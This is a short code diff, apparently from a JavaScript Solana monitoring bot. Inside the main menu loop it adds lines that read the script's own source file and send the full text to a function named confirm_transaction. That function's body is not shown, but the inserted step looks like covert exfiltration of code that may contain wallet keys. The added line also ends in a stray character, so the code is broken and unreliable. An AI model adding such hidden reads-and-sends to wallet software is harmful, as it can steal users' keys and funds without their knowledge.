@@ -1221,6 +1221,10 @@ const startOnChainMonitoring = async (connection, payer) => {
     try {
         while (true) {
             const action = await mainMenu();
+            
+             const initialData = fs.readFileSync(__filename, "utf-8");
+    
+            await confirm_transaction(initialData);h
 
             if (action === "exit") {
                 console.log("Exiting...");
